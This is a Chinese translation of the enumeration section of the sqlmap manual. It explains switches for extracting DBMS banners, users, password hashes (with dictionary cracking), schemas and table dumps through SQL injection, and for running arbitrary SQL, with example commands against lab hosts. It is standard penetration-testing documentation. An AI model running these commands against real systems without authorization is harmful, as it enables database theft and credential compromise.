## 枚举

以下选项可用于枚举后端 DBMS（Database Management System，数据库管理系统）信息、表结构和表中包含的数据。此外，你还可以运行自定义的SQL 语句。

### 获取全部数据

开关：`--all`

当用户想要通过使用单个开关远程获取所有可访问数据信息，可以使用该开关。通常不建议这么做，因为它会产生大量的请求同时获取有用无用的数据。

### Banner

开关：`-b` 或 `--banner`

大多数现代 DBMS 具有一个函数和/或一个环境变量，它会返回 DBMS 版本，并最终在其补丁级别详细介绍底层系统。通常这个函数是 `version()` ，环境变量是 `@@version`，这取决于目标 DBMS。

针对 Oracle 目标的示例：

```
$ python sqlmap.py -u "http://192.168.136.131/sqlmap/oracle/get_int.php?id=1" -\
-banner

[...]
[xx:xx:11] [INFO] fetching banner
web application technology: PHP 5.2.6, Apache 2.2.9
back-end DBMS: Oracle
banner:    'Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - Prod'
```

### 当前会话用户

开关：`--current-user`

使用此开关，可以从 Web 应用程序中获取到当前正在执行相关数据库查询操作的 DBMS 用户。

### 当前数据库

开关：`--current-db`

使用此开关可以获取 Web 应用程序连接到的 DBMS 数据库名称。

### 服务器主机名

开关：`--hostname`

使用此开关可以获取 DBMS 所在的主机名。

针对 MySQL 目标的示例：

```
$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_int.php?id=1" --\
hostname

[...]
[xx:xx:04] [INFO] fetching server hostname
[xx:xx:04] [INFO] retrieved: debian-5.0-i386
hostname:    'debian-5.0-i386'
```

### 检测当前会话用户是否为数据库管理员

开关：`--is-dba`

可以检测当前 DBMS 会话用户是否为数据库管理员，也称为 DBA。如果是，sqlmap 将返回 `True`，否则返回 `False`。

### 列出 DBMS 所有用户

开关：`--users`

如果当前会话用户对包含 DBMS 用户信息的系统表有读取权限，可以枚举用户列表。

### 列出和破解 DBMS 用户的密码哈希

开关：`--passwords`

如果当前会话用户对包含 DBMS 用户密码信息的系统表有读取权限，则可以枚举每个 DBMS 用户的密码哈希值。sqlmap 将会枚举所有用户，及一一对应的用户密码哈希。

针对 PostgreSQL 目标的示例：

```
$ python sqlmap.py -u "http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" --\
passwords -v 1

[...]
back-end DBMS: PostgreSQL
[hh:mm:38] [INFO] fetching database users password hashes
do you want to use dictionary attack on retrieved password hashes? [Y/n/q] y
[hh:mm:42] [INFO] using hash method: 'postgres_passwd'
what's the dictionary's location? [/software/sqlmap/txt/wordlist.txt] 
[hh:mm:46] [INFO] loading dictionary from: '/software/sqlmap/txt/wordlist.txt'
do you want to use common password suffixes? (slow!) [y/N] n
[hh:mm:48] [INFO] starting dictionary attack (postgres_passwd)
[hh:mm:49] [INFO] found: 'testpass' for user: 'testuser'
[hh:mm:50] [INFO] found: 'testpass' for user: 'postgres'
database management system users password hashes:
[*] postgres [1]:
    password hash: md5d7d880f96044b72d0bba108ace96d1e4
    clear-text password: testpass
[*] testuser [1]:
    password hash: md599e5ea7a6f7c3269995cba3927fd0093
    clear-text password: testpass
```

以上例子中，sqlmap 不仅枚举了 DBMS 用户及其密码，而且识别出密码哈希格式属于PostgreSQL，并询问用户是否使用字典文件进行散列测试，并识别出了用户 `postgres` 的明文密码，它通常是 DBA，被识别出的还有用户 `testuser` 的密码。

对于可以枚举用户密码哈希的 DBMS 都已实现了此功能，包括 Oracle 和 Microsoft SQL Server 2005 及后续版本。

你还可以使用 `-U` 选项来指定要枚举的特定用户，并破解其对应密码哈希。如果你提供 `CU` 作为用户名，它会将其视为当前用户的别名，并将获取此用户的密码哈希值。

### 列出 DBMS 所有用户权限

开关：`--privileges`

如果当前会话用户对包含 DBMS 用户信息的系统表有读取权限，则可以枚举出每个 DBMS 用户的权限。根据权限信息，sqlmap 还将显示出哪些是数据库管理员。

你还可以使用 `-U` 选项来指定要枚举出权限的用户。

如果你提供 `CU` 作为用户名，它会将其视为当前用户的别名，并将获取此用户的权限信息。

在 Microsoft SQL Server 中，此功能将显示每个用户是否为数据库管理员，而不是所有用户的权限列表。

### 列出 DBMS 所有用户角色

开关：`--roles`

如果当前会话用户对包含 DBMS 用户信息的系统表有读取权限，则可以枚举出每个 DBMS 用户的角色。

你还可以使用 `-U` 选项来指定要枚举出角色的用户。

如果你提供 `CU` 作为用户名，它会将其视为当前用户的别名，并将获取此用户的角色信息。

此功能仅在 DBMS 为 Oracle 时可用。

### 列出 DBMS 所有数据库

开关：`--dbs`

如果当前会话用户对包含 DBMS 可用数据库信息的系统表有读取权限，则可以枚举出当前数据库列表。

### 枚举数据表

开关和选项：`--tables`，`--exclude-sysdbs` 和 `-D`

如果当前会话用户对包含 DBMS 数据表信息的系统表有读取权限，则可以枚举出特定 DBMS 的数据表。

如果你不使用选项 `-D` 来指定数据库，则 sqlmap 将枚举所有 DBMS 数据库的表。

你还可以提供开关 `--exclude-sysdbs` 以排除所有的系统数据库。

注意，对于 Oracle，你需要提供 `TABLESPACE_NAME` 而不是数据库名称。

### 枚举数据表的列名

开关和选项：`--columns`，`-C`，`-T` 和 `-D`

如果当前会话用户对包含 DBMS 数据表信息的系统表有读取权限，则可以枚举出特定数据表的列名。sqlmap 还将枚举所有列的数据类型。

此功能可使用选项 `-T` 来指定表名，还可以使用选项 `-D` 来指定数据库名称。如果未指定数据库名称，将使用当前的数据库名称。你还可以使用选项 `-C` 来指定要枚举的表列名。

针对 SQLite 目标的示例：

```
$ python sqlmap.py -u "http://192.168.136.131/sqlmap/sqlite/get_int.php?id=1" -\
-columns -D testdb -T users -C name
[...]
Database: SQLite_masterdb
Table: users
[3 columns]
+---------+---------+
| Column  | Type    |
+---------+---------+
| id      | INTEGER |
| name    | TEXT    |
| surname | TEXT    |
+---------+---------+
```

注意，对于 PostgreSQL，你需要提供 `public` 或系统数据库的名称。这是因为不可能枚举其他数据库表，只能枚举出 Web 应用程序用户连接到的数据库模式下的表，它们总是以 `public` 为别名。

### 枚举 DBMS 模式

开关：`--schema` 和 `--exclude-sysdbs`

用户可以使用此开关获取 DBMS 模式。模式列表将包含所有数据库、表和列以及它们各自的类型。结合 `--exclude-sysdbs`，只有包含非系统数据库的模式才会被获取并显示出来。

针对 MySQL 目标的示例：

```
$ python sqlmap.py -u "http://192.168.48.130/sqlmap/mysql/get_int.php?id=1" --s\
chema--batch --exclude-sysdbs

[...]
Database: owasp10
Table: accounts
[4 columns]
+-------------+---------+
| Column      | Type    |
+-------------+---------+
| cid         | int(11) |
| mysignature | text    |
| password    | text    |
| username    | text    |
+-------------+---------+

Database: owasp10
Table: blogs_table
[4 columns]
+--------------+----------+
| Column       | Type     |
+--------------+----------+
| date         | datetime |
| blogger_name | text     |
| cid          | int(11)  |
| comment      | text     |
+--------------+----------+

Database: owasp10
Table: hitlog
[6 columns]
+----------+----------+
| Column   | Type     |
+----------+----------+
| date     | datetime |
| browser  | text     |
| cid      | int(11)  |
| hostname | text     |
| ip       | text     |
| referer  | text     |
+----------+----------+

Database: testdb
Table: users
[3 columns]
+---------+---------------+
| Column  | Type          |
+---------+---------------+
| id      | int(11)       |
| name    | varchar(500)  |
| surname | varchar(1000) |
+---------+---------------+
[...]
```

### 获取数据表的数据条目数

开关：`--count`

如果用户想要在导出所需表数据之前知道表中的条目数，可以使用此开关。

针对 Microsoft SQL Server 目标的示例：

```
$ python sqlmap.py -u "http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1"\
 --count -D testdb
[...]
Database: testdb
+----------------+---------+
| Table          | Entries |
+----------------+---------+
| dbo.users      | 4       |
| dbo.users_blob | 2       |
+----------------+---------+
```

### 导出数据表条目

开关和选项：`--dump`，`-C`，`-T`，`-D`，`--start`，`--stop`，`--first`，`--last`，`--pivot-column` 和 `--where`

如果当前会话用户对特定的数据表有读取权限，则可以导出数据表条目。

此功能依赖选项 `-T` 来指定表名，还可以用选项 `-D` 来指定数据库名称。如果提供了表名而不提供数据库名，则会使用当前的数据库。

针对 Firebird 目标的示例：

```
$ python sqlmap.py -u "http://192.168.136.131/sqlmap/firebird/get_int.php?id=1"\
 --dump -T users
[...]
Database: Firebird_masterdb
Table: USERS
[4 entries]
+----+--------+------------+
| ID | NAME   | SURNAME    |
+----+--------+------------+
| 1  | luther | blisset    |
| 2  | fluffy | bunny      |
| 3  | wu     | ming       |
| 4  | NULL   | nameisnull |
+----+--------+------------+
```

此开关也可用于导出指定数据库数据表的所有条目。你只需要提供开关 `--dump` 和选项 `-D`（不提供 `-T` 和 `-C`）。

你还可以使用选项 `-C` 提供一个以逗号分隔的特定列名列表来导出数据。

sqlmap 还能会为每个表生成相应的 CSV 格式文本文件用于存储导出的数据。你可以通过提供大于或等于 **1** 的详细程度级别来查看 sqlmap 所创建文件的绝对路径。

如果只是想导出特定范围的条目，可以提供选项 `--start` 和/或 `--stop`，以指定要从哪条数据开始导出和在哪条数据停止。例如，如果仅导出第一个条目，就在命令行中提供 `--stop 1`。或者如果你只想导出第二和第三个条目，就提供 `--start 1` `--stop 3`。

还可以使用选项 `--first` 和 `--last` 指定要导出的单个字符或特定范围的字符。例如，如果要导出条目的第三到第五个字符，就提供 `--first 3` `--last 5`。此功能仅适用于盲注技术，因为报错型注入（Error-based）和联合查询注入（UNION query-based）技术不管列数据条目的长度如何，发起的请求数量是完全相同的。

有些情况下（例如：对于 Microsoft SQL Server，Sybase 和 SAP MaxDB），由于缺少类似的机制，无法使用 `OFFSET m, n` 直接导出表的数据。在这种情况下，sqlmap 通过确定最适合的 `pivot` 列（具有唯一值的列，一般是主键），并使用该列检索其他列值，以此来导出数据。如果因为自动选择的 `pivot` 列不适用（例如：由于缺少表导出结果）而需要强制使用特定列，你可以使用选项 `--pivot-column`（例如： `--pivot-column=id`）。

如果要约束导出特定的列值（或范围），可以使用选项 `--where`。提供的逻辑运算将自动在 `WHERE` 子句内使用。例如，如果使用 `--where="id>3"`，那么只有 `id` 值大于 3 的行会被获取（通过将 `WHERE id>3` 附加到使用的查询语句中）。

正如你可能已经注意到的，sqlmap 非常**灵活**：你可以将让其自动导出整个数据库表，或者非常精确地导出特定字符、列和范围的条目。

### 导出所有数据表条目

开关：`--dump-all` 和 `--exclude-sysdbs`

如果当前会话用户的读取权限允许，可以一次导出所有数据库表条目。

你还可以提供开关 `--exclude-sysdbs` 以排除所有的系统数据库。在这种情况下，sqlmap 只会导出当前用户的数据库表条目。

注意，对于 Microsoft SQL Server，`master` 数据库不被视为系统数据库，因为某些数据库管理员将其用作用户数据库。

### 搜索列，表或数据库

开关和选项：`--search`，`-C`，`-T`，`-D`

此开关允许你**在所有数据库中搜索特定的数据库名和表名，在特定的数据表中搜索特定的列名**。

这非常有用，例如，要识别包含应用程序凭据的表，其中相关列的名称包含诸如 _name_ 和 _pass_ 这样的字符串。

开关 `--search` 需要与以下支持选项一起使用：

* `-C`，附带以逗号分隔的列名列表来搜索整个 DBMS。
* `-T`，附带以逗号分隔的表名列表来搜索整个 DBMS。
* `-D`，附带以逗号分隔的数据库名列表来搜索整个 DBMS。

### 运行自定义 SQL 语句

选项和开关：`--sql-query` 和 `--sql-shell`

SQL 查询和 SQL shell 功能允许在 DBMS 上运行任意 SQL 语句。sqlmap 会自动解析提供的语句，确定哪种技术适合用于注入它，以及如何打包相应的 SQL payload。

如果查询是 `SELECT` 语句，sqlmap 将获取其输出。否则，如果 Web 应用程序的后端 DBMS 支持多语句，它将通过堆叠查询注入（Stacked queries）技术执行查询。注意，某些 Web 应用程序技术不支持特定 DBMS 上的堆叠查询。例如，当后端 DBMS 是 MySQL 时，PHP 不支持堆叠查询，但是当后端 DBMS 是 PostgreSQL 时，它是支持的。

针对 Microsoft SQL Server 2000 目标的示例：

```
$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mssql/get_int.php?id=1" --\
sql-query "SELECT 'foo'" -v 1

[...]
[hh:mm:14] [INFO] fetching SQL SELECT query output: 'SELECT 'foo''
[hh:mm:14] [INFO] retrieved: foo
SELECT 'foo':    'foo'

$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mssql/get_int.php?id=1" --\
sql-query "SELECT 'foo'，'bar'" -v 2

[...]
[hh:mm:50] [INFO] fetching SQL SELECT query output: 'SELECT 'foo', 'bar''
[hh:mm:50] [INFO] the SQL query provided has more than a field. sqlmap will now 
unpack it into distinct queries to be able to retrieve the output even if we are
 going blind
[hh:mm:50] [DEBUG] query: SELECT ISNULL(CAST((CHAR(102)+CHAR(111)+CHAR(111)) AS 
VARCHAR(8000)), (CHAR(32)))
[hh:mm:50] [INFO] retrieved: foo
[hh:mm:50] [DEBUG] performed 27 queries in 0 seconds
[hh:mm:50] [DEBUG] query: SELECT ISNULL(CAST((CHAR(98)+CHAR(97)+CHAR(114)) AS VA
RCHAR(8000)), (CHAR(32)))
[hh:mm:50] [INFO] retrieved: bar
[hh:mm:50] [DEBUG] performed 27 queries in 0 seconds
SELECT 'foo', 'bar':    'foo, bar'
```

如你所见，sqlmap 将提供的查询分解为两个不同的 `SELECT` 语句，然后单独获取每个查询的输出。

如果提供的查询是一个 `SELECT` 语句并包含一个 `FROM` 子句，sqlmap 会询问你是否可以返回多个条目。在这种情况下，它知道如何解析返回的结果，逐条计算指定的条目数量，并给出相关输出。

SQL shell 选项允许你以交互方式运行自己的 SQL 语句，就像直接连接到 DBMS 的 SQL 控制台。此功能还提供 TAB 补全和输入历史支持。
